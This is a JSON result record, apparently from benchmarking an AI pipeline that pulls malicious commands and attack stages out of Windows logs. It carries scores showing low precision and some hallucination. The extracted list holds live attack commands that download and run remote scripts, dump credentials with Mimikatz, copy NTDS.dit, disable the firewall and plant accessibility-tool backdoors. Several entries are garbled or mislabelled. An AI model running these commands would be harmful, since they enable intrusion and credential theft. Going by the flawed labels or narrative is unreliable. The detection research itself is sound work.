@@ -1,0 +1,312 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47??\\.ps1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Start-Process .\\T1059.003_script.bat",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C net group \"domain admins\" /domain",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1119 ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest t1547.001 -TestNumbers 1",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg add \"HKEY_LOCAL_MACHINE\\software\\remoteaccess\\rapasswd\" /v \"RAPassword\" /t REG_DWORD /d 1 /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /v \"VerifierDlls\" /t REG_SZ /d \"1\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg.exe delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /v VerifierDlls /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "taskkill.exe /f /im wordpad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "tasklist",
+        "stage": "Discovery"
+      },
+      {
+        "command": "systeminfo",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net time \\127.0.0.1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/T1218.005.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/(Test.hta  -Method POST -UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1; Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "\"Import-Module .\\Invoke-PSImage.ps1; Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "py.exe \"C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py\" ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "python.exe \"C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python37\\python.exe\" C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "python.exe C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /C start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1548.002 -TestNumbers 2",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"$input_table = \\\"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\\\".split('\\\",\"\") $Name = \\\"Debugger\\\" $Value = \\\"C:\\windows\\system32\\cmd.exe\\\" Foreach ($item in $input_table){ $item = $item.trim() $registryPath = \\\"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\\\" IF(!(Test-Path $registryPath)) { New-Item -Path $registryPath -Force New-ItemProperty -Path $registryPath -Name $name -ValueType $value -Force}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType `\"application/json`\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "netsh.exe Advfirewall show allprofiles",
+        "stage": "Discovery"
+      },
+      {
+        "command": "netsh.exe Advfirewall?set?allprofiles state off",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cerutil.exe -decode a.txt b.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "netsh.exe interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C mkdir timestomp; echo ipconfig /all > timestomp/timestomp.txt;",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "reg.exe add HKCU\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options /v verifierdlls /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cscript.exe c:\\atomicredteam\\atomics\\T1059.005\\src\\sys_info.vbs",
+        "stage": "Discovery"
+      },
+      {
+        "command": "vssadmin.exe create shadow /for=c:",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powercfg.exe -lastwake",
+        "stage": "Discovery"
+      },
+      {
+        "command": "schtasks.exe /run /tn \\\\Microsoft\\\\Windows\\\\DiskCleanup\\\\SilentCleanup\\\\I",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wermgr.exe -purgestores",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wermgr.exe upload",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wmic /node:localhost shadowcopy call create Volume=C:",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wmic /node:localhost process call create \"cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"[Net.ServicePointManager]\\`.SecurityProtocol=\\[Net.SecurityProtocolType\\]\\`:Tls12 IEX (IWR '\\\"https://raw.githubusercontent.com/\\bc-security/empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/get-system.ps1\\'' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\\\"\\\"}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "exe2hex.exe c:\\windows\\system32\\drivers\\etc\\hosts",
+        "stage": "Discovery"
+      },
+      {
+        "command": "tasklist /fi \"imagename eq winlogon.exe\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "schtasks.exe /query /tn CCC-AboutWindowTimer",
+        "stage": "Discovery"
+      },
+      {
+        "command": "vssadmin.exe creatshadow /forc:c:",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082 /(Test.hta -Method POST -UseBasicParsing -ContentType \\\"application/json\\\"\\\".",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wmic process where name=\\\"explorer.exe\\\" get ExecutablePath /format:list",
+        "stage": "Discovery"
+      },
+      {
+        "command": "taskmanager.exe",
+        "stage": "Discovery"
+      },
+      {
+        "command": "taskmanager.exe /s \\\" explorer.exe\\\"_",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/test.hta -Method 'POST '-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\u201c, \u201cstage\u201d: \u201cCollection\u201d}], ",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C net stop redis-server",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attackers gained entry through an unspecified method and ran a script that secretly downloaded PowerShell scripts from a distant web server. They launched various attacks using PowerShell processes and were able to establish connections over ports 443 and 8443 using different methods. These commands facilitated information collection about the target system and created new files for potential later usage. Some of the operations can be categorized under defense evasion since they tried to avoid detection by achieving connections through Trojan horses. However, they performed multiple lateral movements by enumerating active tasks and network sessions. It seems that their ultimate goal went beyond mere information gathering because some of the actions could indicate further exploitation of vulnerabilities or perhaps setting up backdoors for future accesses. In summary, this extensive campaign shows how cyberactors might implement sophisticated strategies to achieve their objectives.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 87209,
+      "completion_tokens": 9415,
+      "total_tokens": 96624,
+      "wall_clock_s": 130.18,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.23076923076923078,
+      "recall": 0.75,
+      "f1": 0.3529411764705882,
+      "tp": 15,
+      "fp": 50,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.09230769230769231,
+      "recall": 0.375,
+      "f1": 0.14814814814814817,
+      "tp": 6,
+      "fp": 59,
+      "fn": 10,
+      "recall_partial": 0.4642857142857143
+    },
+    "hallucination_rate": 0.13725490196078433,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 87209,
+      "completion_tokens": 9415,
+      "total_tokens": 96624,
+      "wall_clock_s": 130.18,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
